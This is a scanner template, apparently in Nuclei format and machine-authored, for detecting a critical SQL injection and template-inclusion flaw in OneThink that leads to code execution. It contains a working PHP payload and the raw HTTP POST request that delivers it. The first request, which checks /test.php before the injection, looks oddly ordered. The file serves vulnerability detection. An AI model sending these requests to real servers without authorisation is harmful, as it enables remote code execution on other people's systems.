id: onethink-category-sql-injection
info:
  name: OneThink Category Method Code Execution Vulnerabilities
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    OneThink has a SQL injection vulnerability in the category parameter of the front-end home/article/index method. Exploitation could allow an attacker to include arbitrary templates, leading to potential server compromise.
  tags: sql-injection,file-inclusion
  classification:
    cvss-score: 10.0
  reference:
    - https://www.qshu1.com/2022/04/11/onethink%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%95%B4%E7%90%86/

variables:
  payload: "<?=print_r(md5(1234));unlink(__FILE__);?>"

http:
  - raw:
      - |
        GET /test.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "202cb962ac59075b964b07152d234b70"
  - raw:
      - |
        POST /index.php?s=home/Article/index HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        0={{payload}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
    extractors:
      - type: regex
        name: output
        regex:
          - "202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
        group: 1
